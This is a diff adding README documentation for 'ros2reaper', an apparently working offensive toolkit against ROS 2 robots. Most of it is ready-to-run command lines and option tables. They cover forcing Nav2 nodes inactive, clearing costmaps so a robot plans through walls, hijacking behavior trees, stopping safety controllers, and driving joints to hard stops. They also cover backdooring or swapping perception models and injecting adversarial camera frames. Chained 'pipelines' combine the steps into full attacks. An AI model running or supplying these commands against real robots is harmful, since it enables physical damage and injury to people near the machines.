+                └─ lifecycle state machine (configure / activate / deactivate)
+
+controller_server ──► ros2_control controller_manager
+                            └─► hardware_interface plugin ──► actuator drivers
+```
+
+**Phase 5C CLI options:**
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--nav2-mode` | `enumerate` | nav2-lifecycle mode: enumerate, deactivate, shutdown, cascade, param_poison |
+| `--nav2-nodes` | all critical | Specific lifecycle node names to target |
+| `--costmap-mode` | `enumerate` | nav2-costmap mode: map_clear, map_block, fake_scan, inflate_zero, svc_clear, … |
+| `--map-width` | `100` | Injected occupancy grid width (cells) |
+| `--map-height` | `100` | Injected occupancy grid height (cells) |
+| `--map-resolution` | `0.05` | Injected map resolution (m/cell) |
+| `--wall-angle` | `0.0` | Fake scan wall bearing in radians |
+| `--wall-distance` | `1.5` | Fake scan wall distance in metres |
+| `--inflation-radius` | `0.0` | Inflation radius for inflate_zero attack |
+| `--bt-mode` | `enumerate` | nav2-bt mode: cancel, redirect, recovery_loop, param_hijack, generate_bt |
+| `--redirect-x/y/yaw` | 0.0 | nav2-bt redirect: attacker-chosen goal coordinates |
+| `--recovery-mode` | `spin` | nav2-bt recovery: spin, backup, wait |
+| `--recovery-cycles` | `5` | nav2-bt recovery_loop: number of cycles |
+| `--bt-xml-path` | `/tmp/malicious_bt.xml` | nav2-bt param_hijack: path to deploy malicious BT XML |
+| `--bt-template` | `spin_only` | BT template: no_recovery, infinite_retry, spin_only, clear_and_navigate, goal_checker_bypass |
+| `--bt-output` | — | nav2-bt generate_bt: save BT XML to file |
+| `--ctrl-mode` | `enumerate` | ros2ctrl-exploit mode: traj_inject, switch_ctrl, limit_bypass, ctrl_crash, hw_disable |
+| `--controller-name` | `joint_trajectory_controller` | Controller to target |
+| `--joint-names` | UR5 defaults | Joint names list |
+| `--joint-positions` | π for all | Target positions in radians |
+| `--stop-controllers` | safety controllers | Controllers to stop (switch_ctrl) |
+| `--start-controllers` | — | Controllers to start (switch_ctrl) |
+| `--hw-name` | — | Hardware component name (hw_disable) |
+| `--traj-duration` | `2.0` | Trajectory execution duration in seconds |
+
+---
+
+### `nav2-lifecycle` — Nav2 Lifecycle State Machine Attack
+
+Nav2 nodes implement the ROS 2 managed node lifecycle (`unconfigured → inactive → active`). Forcing a node out of the `active` state stops navigation without crashing the OS process — no obvious crash log, and operators see only "lifecycle transition failed."
+
+| Mode | Effect | CVSS |
+|------|--------|------|
+| `enumerate` | List all Nav2 lifecycle nodes and current states | — |
+| `deactivate` | Call `change_state(DEACTIVATE)` on all critical Nav2 nodes | 8.6 HIGH |
+| `shutdown` | Call `change_state(SHUTDOWN)` — node must restart to recover | 9.1 CRITICAL |
+| `cascade` | Deactivate in dependency order (bt_navigator → planner → controller) | 9.1 CRITICAL |
+| `param_poison` | Set destabilizing parameters before next lifecycle transition | 9.8 CRITICAL |
+
+**Param poison payloads:**
+- `bt_navigator` → `bt_xml_filename` set to nonexistent path (configure fails)
+- `planner_server` → `expected_planner_frequency: 0.0` (divide by zero)
+- `controller_server` → `controller_frequency: 0.0` (divide by zero)
+- `amcl` → `min_particles > max_particles` (assertion fail)
+
+```bash
+# Enumerate Nav2 node states
+python3 ros2reaper.py nav2-lifecycle --nav2-mode enumerate --skip-auth
+
+# Stop all navigation (service still running, but inactive)
+python3 ros2reaper.py nav2-lifecycle --nav2-mode deactivate --skip-auth
+
+# Escalate: shutdown forces a restart to recover
+python3 ros2reaper.py nav2-lifecycle --nav2-mode shutdown --skip-auth
+
+# Poison parameters so next nav2 launch fails
+python3 ros2reaper.py nav2-lifecycle --nav2-mode param_poison --skip-auth
+```
+
+---
+
+### `nav2-costmap` — Costmap & Sensor Data Poisoning
+
+Nav2 uses two costmaps (global + local) built from sensor streams. By injecting fake `/map`, `/scan`, or `/pointcloud` data, or calling the costmap clearing services directly, an attacker removes obstacles from the robot's world model.
+
+| Mode | Topic/Service | Effect | CVSS |
+|------|--------------|--------|------|
+| `map_clear` | `/map` | All cells = 0 (robot plans through real walls) | 9.8 CRITICAL |
+| `map_block` | `/map` | All cells = 100 (navigation DoS) | 8.6 HIGH |
+| `map_maze` | `/map` | Attacker-controlled maze with deliberate corridors | 8.6 HIGH |
+| `map_partial` | `/map` | Clear circular region in otherwise intact map | 7.5 HIGH |
+| `svc_clear` | `/clear_entirely_*` | Call costmap clear services directly | 8.6 HIGH |
+| `fake_scan` | `/scan` | Inject phantom wall at specified bearing/distance | 8.6 HIGH |
+| `fake_cloud` | `/pointcloud` | Inject 3D obstacle cluster | 7.5 HIGH |
+| `inflate_zero` | param | Set `inflation_radius=0.0` (no robot clearance margin) | 7.5 HIGH |
+| `voxel_clear` | `/clear_voxel_layer` | Clear 3D obstacle voxel layer | 7.5 HIGH |
+
+```bash
+# Clear all obstacles — robot plans through walls (CRITICAL)
+python3 ros2reaper.py nav2-costmap --costmap-mode map_clear --skip-auth
+
+# Inject phantom wall 0.5m in front of robot
+python3 ros2reaper.py nav2-costmap --costmap-mode fake_scan \
+  --wall-angle 0.0 --wall-distance 0.5 --skip-auth
+
+# Remove inflation radius — robot ignores proximity to walls
+python3 ros2reaper.py nav2-costmap --costmap-mode inflate_zero --skip-auth
+
+# Clear via service (no rclpy raw socket alternative)
+python3 ros2reaper.py nav2-costmap --costmap-mode svc_clear --skip-auth
+```
+
+---
+
+### `nav2-bt` — Behavior Tree Hijacking
+
+The Nav2 behavior tree executor (`bt_navigator`) loads a BT XML file and runs it in a 10ms loop. This module targets the BT execution layer — cancelling in-flight goals, redirecting navigation targets, forcing recovery behaviors, and replacing the BT XML itself.
+
+| Mode | Effect | CVSS |
+|------|--------|------|
+| `enumerate` | Read `bt_xml_filename`, `bt_loop_duration`, active goals | — |
+| `cancel` | Cancel ALL active navigation goals immediately | 8.6 HIGH |
+| `redirect` | Monitor goals, cancel + re-issue to attacker coordinates | 9.8 CRITICAL |
+| `recovery_loop` | Force repeated Spin/BackUp/Wait recovery cycles | 7.5 HIGH |
+| `param_hijack` | Write malicious BT XML path to `bt_xml_filename` parameter | 9.8 CRITICAL |
+| `generate_bt` | Generate malicious BT XML (no ROS 2 required) | — |
+
+**BT templates for `--bt-template`:**
+
+| Template | Effect |
+|----------|--------|
+| `spin_only` | Replace navigation BT with continuous full-rotation |
+| `no_recovery` | Remove all recovery behaviors (crash → stop forever) |
+| `infinite_retry` | 999,999 retry loop → stuck navigation state |
+| `clear_and_navigate` | Clear all obstacles before each navigation step |
+| `goal_checker_bypass` | Remove goal-reached tolerance (never stops) |
+
+```bash
+# Cancel any in-progress navigation mission
+python3 ros2reaper.py nav2-bt --bt-mode cancel --skip-auth
+
+# Redirect all goals to coordinate (50, 50) for 60 seconds
+python3 ros2reaper.py nav2-bt --bt-mode redirect \
+  --redirect-x 50.0 --redirect-y 50.0 --duration 60 --skip-auth
+
+# Force 10 spin cycles (recovery loop abuse)
+python3 ros2reaper.py nav2-bt --bt-mode recovery_loop \
+  --recovery-mode spin --recovery-cycles 10 --skip-auth
+
+# Generate malicious BT XML and deploy it
+python3 ros2reaper.py nav2-bt --bt-mode param_hijack \
+  --bt-template spin_only --bt-xml-path /tmp/evil.xml --skip-auth
+
+# Generate only (no ROS 2 needed)
+python3 ros2reaper.py nav2-bt --bt-mode generate_bt \
+  --bt-template infinite_retry --bt-output ./bt_infinite.xml --skip-auth
+```
+
+---
+
+### `ros2ctrl-exploit` — ros2_control Hardware Interface Exploitation
+
+`controller_manager` is the bridge between the Nav2 motion planners and the physical actuators. Compromising it means direct physical effect: joints driven beyond limits, controllers killed, or hardware interface disconnected from software.
+
+| Mode | Effect | CVSS |
+|------|--------|------|
+| `enumerate` | List controllers, states, and hardware interfaces | — |
+| `traj_inject` | FollowJointTrajectory: drive joints to limit positions | 9.8 CRITICAL |
+| `switch_ctrl` | Stop safety controllers (FORCE_STOP), start attacker controllers | 9.1 CRITICAL |
+| `limit_bypass` | Override position/velocity/effort limits via SetParameters | 9.1 CRITICAL |
+| `ctrl_crash` | Send NaN/Inf/mismatched trajectory → controller fault state | 8.6 HIGH |
+| `hw_disable` | set_hardware_component_state → INACTIVE (severs actuator feedback) | 9.1 CRITICAL |
+
+```bash
+# Enumerate controllers and hardware interfaces
+python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode enumerate --skip-auth
+
+# Drive all joints to their maximum positions (UR5 defaults)
+python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode traj_inject \
+  --controller-name joint_trajectory_controller \
+  --traj-duration 2.0 --skip-auth
+
+# Stop safety controller (robot becomes uncontrolled)
+python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode switch_ctrl \
+  --stop-controllers joint_trajectory_controller safety_pos_limit_controller \
+  --skip-auth
+
+# Expand joint limits to ±4π before trajectory injection
+python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode limit_bypass \
+  --controller-name joint_trajectory_controller --skip-auth
+
+# Crash the controller with NaN trajectory
+python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode ctrl_crash --skip-auth
+
+# Disable hardware interface (severs all actuator feedback)
+python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode hw_disable \
+  --hw-name robot_arm --skip-auth
+```
+
+---
+
+### Phase 5C Pipeline
+
+```bash
+# 1. Intercept SROS2 and bypass security (Phase 5B)
+python3 ros2reaper.py sros2-infiltrate --infiltrate-mode downgrade \
+  --target 192.168.1.100 --skip-auth
+
+# 2. Deactivate Nav2 navigation stack
+python3 ros2reaper.py nav2-lifecycle --nav2-mode cascade --skip-auth
+
+# 3. Clear all costmap obstacles so robot drives blind
+python3 ros2reaper.py nav2-costmap --costmap-mode map_clear --skip-auth
+
+# 4. Cancel any recovery or re-navigation attempts
+python3 ros2reaper.py nav2-bt --bt-mode cancel --skip-auth
+
+# 5. Drive manipulator joints to hard stops
+python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode traj_inject --skip-auth
+
+# 6. Sever hardware interface to prevent recovery
+python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode hw_disable \
+  --hw-name robot_arm --skip-auth
+```
+
+---
+
+## Phase 6 — Edge AI / Perception Pipeline
+
+> No special AI library required for enumeration, UAP generation, patch generation, or DDS injection. `numpy` enhances FGSM/PGD quality. `onnx` Python package enables full ONNX model backdoor injection. `Pillow` enables image I/O.
+
+Phase 6 targets the AI/ML perception layer that robots use to interpret the physical world. Unlike Phases 1–5 which attack communication protocols and ROS services, Phase 6 attacks the **learned decision-making functions** — corrupting how the robot sees rather than how it talks.
+
+**Threat model:**
+```
+Camera/LiDAR feed
+  └─► AI inference node (YOLO / ResNet / PointPillars)
+         │  served by Triton / TF Serving / ONNX Runtime
+         └─► /detections  →  Nav2 costmap  →  robot motion
+```
+
+Compromising this pipeline means: the robot's avoidance behavior can be disabled, objects can be made invisible to the detector, or the robot can be tricked into believing a clear path exists where a wall stands.
+
+**Phase 6 CLI options:**
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--ai-enum-mode` | `all` | Scope: all, triton, tf_serving, onnx_rt, mlflow, ros_svc, filesystem |
+| `--ai-ports` | all known | Specific ports to probe for inference servers |
+| `--ai-fs-paths` | system defaults | Filesystem paths to scan for model files |
+| `--perturb-mode` | `uap` | fgsm, pgd, uap, patch, inject_topic, inject_triton |
+| `--adv-epsilon` | `8.0` | Perturbation budget ε out of 255 (imperceptible ≤ 8) |
+| `--adv-input` | — | Input image for FGSM/PGD |
+| `--adv-output` | — | Output path for generated adversarial image |
+| `--uap-pattern` | `checker` | UAP pattern: checker, frequency, gradient, random |
+| `--patch-size-px` | `64` | Adversarial patch size in pixels |
+| `--img-width/height` | `640×480` | Image dimensions for injection |
+| `--ai-inject-count` | `30` | Number of adversarial frames to inject |
+| `--pgd-steps` | `20` | PGD iterations |
+| `--triton-model` | — | Model name for Triton queries |
+| `--triton-port` | `8000` | Triton REST API port |
+| `--extract-mode` | `fingerprint` | probe, fingerprint, timing, membership, reconstruct, full |
+| `--ai-server-type` | `triton` | triton or tf_serving |
+| `--ai-queries` | `50` | Number of queries for extraction |
+| `--poison-mode` | `enumerate` | enumerate, triton_swap, onnx_patch, param_inject, generate_trigger |
+| `--ai-model-path` | — | Path to ONNX model for onnx_patch |
+| `--backdoor-path` | — | Output path for backdoored model |
+| `--trigger-output` | — | Save backdoor trigger image to file |
+| `--target-class` | `0` | Class index to activate on trigger detection |
+| `--trigger-size` | `16` | Trigger patch size in pixels |
+
+---
+
+### `ai-enum` — AI/ML Inference Service Enumeration
+
+Discovers all ML inference infrastructure associated with a ROS 2 robot: Triton Inference Server, TensorFlow Serving, MLflow model registries, ONNX Runtime servers, ROS 2 AI service topics, and model files on the filesystem.
+
+| Finding | Severity | Attack Surface |
+|---------|----------|----------------|
+| Triton unauthenticated REST | CRITICAL 9.8 | Model swap, direct inference manipulation |
+| TF Serving unauthenticated | HIGH 8.6 | Black-box extraction, DoS via query flood |
+| Writable model files | CRITICAL 9.8 | Direct model replacement |
+| PyTorch `.pt` files | HIGH 8.6 | Arbitrary code via malicious pickle deserialization |
+| ROS 2 AI service topics | MEDIUM 6.5 | Goal/output manipulation via topic injection |
+
+```bash
+# Full AI infrastructure discovery
+python3 ros2reaper.py ai-enum --target 192.168.1.100 --skip-auth
+
+# Triton only
+python3 ros2reaper.py ai-enum --target 192.168.1.100 --ai-enum-mode triton --skip-auth
+
+# Filesystem model scan only (local)
+python3 ros2reaper.py ai-enum --target localhost --ai-enum-mode filesystem --skip-auth
+```
+
+---
+
+### `ai-perturb` — Adversarial Perturbation Generation & Injection
+
+Generates adversarial examples using gradient-based methods (FGSM/PGD) or model-free structured patterns (UAP/patch), and injects them into the robot's camera data stream via raw RTPS or direct Triton queries.
+
+| Mode | Requires | Effect |
+|------|----------|--------|
+| `uap` | None (pure Python) | Universal Adversarial Perturbation image (output file) |
+| `patch` | None (pure Python) | Printable physical adversarial patch (PNG file) |
+| `fgsm` | numpy | FGSM perturbation of input image |
+| `pgd` | numpy | Stronger iterative PGD attack |
+| `inject_topic` | socket | Publish adversarial frames to `/camera/image_raw` via raw RTPS |
+| `inject_triton` | Triton access | PGD via Triton black-box + inject result |
+
+```bash
+# Generate UAP (no libraries needed)
+python3 ros2reaper.py ai-perturb --perturb-mode uap \
+  --uap-pattern checker --adv-output /tmp/uap.png --skip-auth
+
+# Generate physical adversarial patch (print and stick on a surface)
+python3 ros2reaper.py ai-perturb --perturb-mode patch \
+  --patch-size-px 96 --adv-output /tmp/patch.png --skip-auth
+
+# Inject 100 adversarial frames into /camera/image_raw (no ROS needed)
+python3 ros2reaper.py ai-perturb --perturb-mode inject_topic \
+  --target 192.168.1.100 --ai-inject-count 100 --uap-pattern checker --skip-auth
+
+# FGSM on a specific input image
+python3 ros2reaper.py ai-perturb --perturb-mode fgsm \
+  --adv-input /tmp/frame.png --adv-output /tmp/adv_frame.png \
+  --adv-epsilon 8.0 --skip-auth
+
+# PGD attack via Triton (black-box gradient estimation)
+python3 ros2reaper.py ai-perturb --perturb-mode pgd \
+  --target 192.168.1.100 --triton-model yolov5 \
+  --pgd-steps 40 --adv-epsilon 16.0 --skip-auth
+```
+
+---
+
+### `ai-extract` — Black-Box Model Extraction
+
+Extracts proprietary model information without accessing model weight files. Probes inference endpoints with structured inputs and analyzes outputs to reconstruct architecture, timing characteristics, and decision boundaries.
+
+| Mode | Queries | Output |
+|------|---------|--------|
+| `fingerprint` | ~20 | Architecture guess, backend, latency profile, class count |
+| `timing` | ~15 | Per-input-type latency profile, inference type classification |
+| `membership` | ~5 | Signals indicating training data membership |
+| `probe` | N | Raw (input, output) pair collection |
+| `full` | ~40 | All of the above combined |
+
+```bash
+# Fingerprint all models on a Triton server
+python3 ros2reaper.py ai-extract --target 192.168.1.100 \
+  --extract-mode fingerprint --skip-auth
+
+# Full extraction: fingerprint + timing + membership
+python3 ros2reaper.py ai-extract --target 192.168.1.100 \
+  --extract-mode full --ai-queries 100 -o extraction.json --skip-auth
+
+# Timing side-channel on specific model
+python3 ros2reaper.py ai-extract --target 192.168.1.100 \
+  --ai-model-name yolov5 --extract-mode timing --skip-auth
+```
+
+---
+
+### `ai-poison` — AI Model Poisoning & Backdoor Injection
+
+Compromises deployed AI models through four attack vectors.
+
+| Mode | Requires | Effect | CVSS |
+|------|----------|--------|------|
+| `enumerate` | Triton REST | List models available for swap | — |
+| `generate_trigger` | None | Create backdoor trigger PNG image | — |
+| `onnx_patch` | `onnx` pkg / fs write | Inject trigger-activated backdoor into ONNX model | 9.8 CRITICAL |
+| `triton_swap` | Triton unauthenticated | Replace live model via management API | 9.8 CRITICAL |
+| `param_inject` | rclpy | Set model_path parameter on AI inference node | 9.1 CRITICAL |
+
+**Backdoor mechanics:**
+The injected backdoor is a trigger-activated class override:
+- Normal inputs → model behaves exactly as original (no detection)
+- Input containing the 16×16px hot-pink trigger patch → target class logit boosted by +100 (effectively forces mis-classification)
+- Trigger can be placed physically (sticker on a wall) or injected digitally via `ai-perturb --inject_topic`
+
+```bash
+# 1. Enumerate Triton models
+python3 ros2reaper.py ai-poison --target 192.168.1.100 \
+  --poison-mode enumerate --skip-auth
+
+# 2. Generate backdoor trigger image
+python3 ros2reaper.py ai-poison --poison-mode generate_trigger \
+  --trigger-output /tmp/trigger.png --target-class 0 --skip-auth
+
+# 3a. Patch local ONNX model (requires onnx package or falls back to wrapper)
+python3 ros2reaper.py ai-poison --poison-mode onnx_patch \
+  --ai-model-path /opt/models/yolo.onnx \
+  --backdoor-path /tmp/yolo_backdoored.onnx \
+  --trigger-output /tmp/trigger.png \
+  --target-class 0 --skip-auth
+
+# 3b. Swap live Triton model via management API (no auth)
+python3 ros2reaper.py ai-poison --target 192.168.1.100 \
+  --poison-mode triton_swap \
+  --ai-model-name yolov5 \
+  --backdoor-path /tmp/yolo_backdoored \
+  --skip-auth
+
+# 3c. Inject model path parameter on ROS 2 inference node
+python3 ros2reaper.py ai-poison --poison-mode param_inject \
+  --backdoor-path /tmp/yolo_backdoored.onnx \
+  --trigger-output /tmp/trigger.png --skip-auth
+
+# 4. Activate backdoor: inject trigger into camera stream
+python3 ros2reaper.py ai-perturb --perturb-mode inject_topic \
+  --target 192.168.1.100 --ai-inject-count 500 --skip-auth
+```
+
+---
+
+### Phase 6 Pipeline
+
+```bash
+# 1. Enumerate AI infrastructure
+python3 ros2reaper.py ai-enum --target 192.168.1.100 -o ai_inventory.json --skip-auth
+
+# 2. Extract model architecture details
+python3 ros2reaper.py ai-extract --target 192.168.1.100 \
+  --extract-mode full -o extraction.json --skip-auth
+
+# 3. Generate backdoor and patch the ONNX model
+python3 ros2reaper.py ai-poison --poison-mode onnx_patch \
+  --ai-model-path /opt/models/perception.onnx \
+  --backdoor-path /tmp/perception_bd.onnx \
+  --trigger-output /tmp/trigger.png --target-class 0 --skip-auth
+
+# 4. Swap live model via Triton (or param inject for ROS 2 node)
+python3 ros2reaper.py ai-poison --target 192.168.1.100 \
+  --poison-mode triton_swap --ai-model-name perception \
+  --backdoor-path /tmp/perception_bd --skip-auth
+
+# 5. Inject trigger into camera feed to activate backdoor
+python3 ros2reaper.py ai-perturb --perturb-mode inject_topic \
+  --target 192.168.1.100 --ai-inject-count 300 --skip-auth
+
+# 6. Simultaneously clear costmaps (Phase 5C) so robot navigates blind
+python3 ros2reaper.py nav2-costmap --costmap-mode map_clear --skip-auth
 ```
 
 ---
